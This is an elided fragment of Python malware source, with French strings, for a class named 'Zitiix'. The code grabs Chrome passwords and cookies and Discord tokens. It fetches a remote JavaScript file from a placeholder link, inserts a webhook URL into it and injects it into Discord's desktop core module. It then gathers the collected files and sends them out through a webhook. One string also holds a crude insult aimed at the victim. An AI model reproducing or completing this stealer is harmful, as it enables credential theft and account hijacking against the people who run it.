...
class Zitiix:
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Zitiix"
        ...
        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"{os.getlogin()} il a pas google ce fdp déso mec\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    f = requests.get("LE LIEN DU FICHIER GRAB JS").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def SendInfo(self):
        ...
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Fichiers Trouvés : "
        embed = {
            "avatar_url":"",
            "embeds": [
                {
